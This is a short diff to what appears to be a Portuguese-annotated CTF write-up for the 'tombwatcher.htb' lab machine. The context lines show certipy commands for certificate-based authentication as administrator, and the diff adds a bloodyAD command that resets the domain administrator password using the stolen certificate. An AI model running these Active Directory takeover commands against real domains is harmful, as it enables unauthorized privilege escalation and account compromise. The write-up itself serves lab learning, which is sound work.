@@ -127,3 +127,8 @@ certipy req -u 'cert_admin@tombwatcher.htb' -p 'P@ssw0rd123!' -dc-ip '10.10.11.7
 ```bash
 certipy auth -dc-ip '10.10.11.72' -pfx 'administrator.pfx' -domain 'tombwatcher.htb' -ldap-shell
 ```
+
+# alternativa mudar o password com bloodyAD
+```bash
+bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -k pfx=administrator.pfx set password 'administrator' 'NewPassw0rd!'
+```
